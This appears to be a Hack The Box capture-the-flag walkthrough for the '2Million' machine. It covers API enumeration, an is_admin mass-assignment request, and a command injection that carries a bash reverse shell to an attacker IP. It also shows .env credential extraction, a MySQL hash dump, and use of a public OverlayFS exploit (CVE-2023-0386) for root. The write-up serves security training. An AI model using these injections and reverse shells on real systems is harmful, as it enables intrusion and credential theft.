# 2Million HTB Walkthrough

## Enumeration

* Target is a Linux VM with ports **22** and **80** open.
* Homepage resembles the old HTB site.
* `/invite` page requires an invite code.

### Obfuscated JS Found in Source Code

```javascript
eval(function(p,a,c,k,e,d){...})
```

### Deobfuscated JavaScript:

```javascript
function verifyInviteCode(code){
    var formData = {"code": code};
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response){ console.log(response) },
        error: function(response){ console.log(response) }
    })
}

function makeInviteCode(){
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response){ console.log(response) },
        error: function(response){ console.log(response) }
    })
}
```

### Step 1: Generate Invite Code

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

**Response:**
ROT13-encoded message

> "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"

Decrypted:

> In order to generate the invite code, make a POST request to `/api/v1/invite/generate`

### Step 2: Get Invite Code

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
```

**Response:** Base64-encoded string → `VDYwUTctTDNVRjAtOFpIVEgtWENDNVM=` → decoded to `HCGT8-QMFDG-2HB3O-RF0BB` → works.

* Redirected to `/register` → account creation → login successful.

---

## Post-login Enumeration

Didn't find much initially. Hint suggested checking available endpoints.

```bash
curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=6q3rgk6n1eht53emhqf3si7ug4"
```

### API Endpoints

#### ✅ User Endpoints

**GET:**

* `/api/v1`
* `/api/v1/invite/how/to/generate`
* `/api/v1/invite/generate`
* `/api/v1/invite/verify`
* `/api/v1/user/auth`
* `/api/v1/user/vpn/generate`
* `/api/v1/user/vpn/regenerate`
* `/api/v1/user/vpn/download`

**POST:**

* `/api/v1/user/register`
* `/api/v1/user/login`

#### ✅ Admin Endpoints

**GET:**

* `/api/v1/admin/auth`

**POST:**

* `/api/v1/admin/vpn/generate`

**PUT:**

* `/api/v1/admin/settings/update`

---

## Exploitation

### Step 1: Become Admin

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  --cookie "PHPSESSID=6q3rgk6n1eht53emhqf3si7ug4" \
  -H "Content-Type: application/json" \
  -d '{"user":"abc","password":"123", "email":"abc@abc.com", "is_admin":1}'
```

**Verify:**

```bash
curl -X GET http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=..."
```

### Step 2: Generate VPN Config (Command Injection)

```bash
curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate \
  --cookie "PHPSESSID=..." \
  -H "Content-Type: application/json" \
  -d '{"username":"abc; bash -c '\''bash -i >& /dev/tcp/10.10.14.55/1337 0>&1'\'';#"}'
```

* Gained shell as `www-data`

### Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Flag Access

```bash
cat /home/admin/user.txt
# Permission denied
```

### Extract `.env` Credentials

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### SSH as Admin

```bash
ssh admin@2million.htb
```

---

## Privilege Escalation

* No sudo rights
* Dump users from MySQL:

```sql
SELECT * FROM users;
```

| id | username     | email                                                           | password (bcrypt)       | is\_admin |
| -- | ------------ | --------------------------------------------------------------- | ----------------------- | --------- |
| 11 | TRX          | [trx@hackthebox.eu](mailto:trx@hackthebox.eu)                   | \$2y\$10\$TG6...U3loEMq | 1         |
| 12 | TheCyberGeek | [thecybergeek@hackthebox.eu](mailto:thecybergeek@hackthebox.eu) | \$2y\$10\$wAT...bzw4QK  | 1         |

* Cracking failed due to bcrypt

### Hint: Check Admin's Email

```bash
cat /var/mail/admin
```

**From:** [ch4p@2million.htb](mailto:ch4p@2million.htb)
**Mentions:** OverlayFS vulnerability

### Confirm OS Version

```bash
lsb_release -a
```

```
Ubuntu 22.04.2 LTS (Jammy)
```

### Exploit Used

**CVE-2023-0386** (OverlayFS)

* Used exploit from: [https://github.com/puckiestyle/CVE-2023-0386](https://github.com/puckiestyle/CVE-2023-0386)
* SCP'ed to target, followed README instructions

### Root Access

```bash
cat /root/root.txt
```
